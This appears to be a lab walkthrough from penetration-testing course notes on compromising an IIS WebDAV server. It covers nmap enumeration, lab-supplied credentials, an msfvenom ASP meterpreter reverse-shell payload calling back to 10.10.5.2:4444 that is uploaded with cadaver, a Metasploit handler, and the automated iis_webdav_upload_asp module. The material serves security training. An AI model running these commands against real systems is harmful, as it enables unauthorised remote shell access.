Practical Demonstration
- `nmap -sV -p 80 --script=http-enum 10.2.30.233`
- The 401 Unauthorized result for `/webdav/` depicted in the Nmap Script scan signifies that authentication is enabled for the `webdav` service hosted on the web server.
- We can use the web browser to verify that `webdav` is hosted on the web server by navigating to the `/webdav/` directory.
- The username and password have been provided in the lab to prevent us from spending time on performing a bruteforce attack, the username is `bob` and the password is `password_123321`.

- Manual Exploitation (Generating a payload using MSFvenom and executing it on the target system.)
	- MSFvenom
		- MSFvenom is a Metasploit tool used to generate payloads used for reverse shell access to a target system.
		- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=4444 -f asp > shell.asp`
		- It is recommended to use the 32 bit architecture (x86), if one is unsure of the architecture the target system's operating system is using, since 32 bit code will work on both 32 and 64 bit architecture.
	- Using cadaver to  upload the asp reverse shell to the target system
		- `cadaver http://10.2.30.233/webdav`
		- `ls`
		- `put /root/shell.asp`
	- Before we execute the shell.asp file on the target system, we need to set up a listener, or a handler, on our own machine, that will receive the reverse connection from the actual target system, and then send the stage that will then provide us with a meterpreter session when executed.
	- `service postgresql start && msfconsole`
	- `use multi/handler`
	- The options we specify in the handler's options should be the same ones we used to create the payload using msfvenom earlier.
	- `options`
	- `set payload windows/meterpreter/reverse_tcp`
	- `set LHOST 10.10.5.2`
	- `set LPORT 4444`
	- `run`
	- The handler here is a listener that is looking for a reverse connection from the reverse shell payload we uploaded to the target system, we will now execute the file on the target system and the handler will receive a connection, send back a stage, and open up a meterpreter session.
		- `sysinfo`
		- `getuid`
	- Once the exploitation process is complete, it is recommended to delete the reverse shell payload we uploaded to the webdav directory earlier.
		- `cadaver`
		- `ls`
		- `delete shell.asp`
		- `ls`

- Automated Exploitation using the `iis_webdav_upload_asp` Metasploit exploit module.
	- `use exploit/windows/iis/iis_webdav_upload_asp`
	- `set payload windows/meterpreter/reverse_tcp`
	- `options`
	- `set LHOST 10.10.5.2`
	- `set LPORT 4444`
	- `set HttpUsername bob`
	- `set HttpPassword password_123321`
	- `show options`
	- `set RHOSTS 10.2.30.233`
	- `set PATH /webdav/metasploit.asp`
	- `exploit`
	- Meterpreter Session
		- `sysinfo`
		- `getuid`